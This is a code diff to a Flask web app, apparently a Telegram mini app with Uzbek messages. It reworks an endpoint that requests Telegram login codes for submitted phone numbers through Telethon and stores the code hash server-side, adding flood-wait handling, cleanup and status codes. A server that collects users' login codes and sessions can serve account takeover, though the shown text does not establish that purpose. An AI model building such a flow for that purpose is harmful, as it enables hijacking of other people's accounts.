@@ -46,27 +46,30 @@ def miniapp():
 # SEND CODE
 # =====================
 from telethon.sessions import StringSession
+from telethon.errors import FloodWaitError
+import asyncio
 
 @app.route("/send_code", methods=["POST"])
 def send_code():
     phone = request.json.get("phone")
 
     if not phone:
-        return jsonify({"status": "error", "message": "Telefon raqam yo‘q"})
+        return jsonify({"status": "error", "message": "Telefon raqam yo‘q"}), 400
 
     async def _send():
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
 
-        sent = await client.send_code_request(phone)
+        try:
+            sent = await client.send_code_request(phone)
+            return sent.phone_code_hash
 
-        await client.disconnect()
-        return sent.phone_code_hash   # 🔥 MANA TO‘G‘RISI
+        finally:
+            await client.disconnect()
 
     try:
         phone_code_hash = asyncio.run(_send())
 
-        # 🔐 HASH NI DB GA YOZAMIZ
         conn = get_db()
         cur = conn.cursor()
         cur.execute("""
@@ -80,25 +83,17 @@ def send_code():
         conn.commit()
         conn.close()
 
-        return jsonify({"status": "ok"})
+        return jsonify({"status": "ok"}), 200
 
-    except Exception as e:
-        print("SEND_CODE ERROR:", repr(e))
-        return jsonify({"status": "error", "message": str(e)})
-
-    sent = await client.send_code_request(phone)
-
-    if not sent:
-        return jsonify({
-            "status": "error",
-            "message": "Telegram kod yubormadi"
-        }), 500
-    
     except FloodWaitError as e:
         return jsonify({
             "status": "error",
-            "message": f"{e.seconds} soniya kuting, Telegram blok qo‘ydi"
+            "message": f"{e.seconds} soniya kuting, Telegram vaqtincha blok qo‘ydi"
         }), 429
+
+    except Exception as e:
+        print("SEND_CODE ERROR:", repr(e))
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 # =====================
 # VERIFY CODE
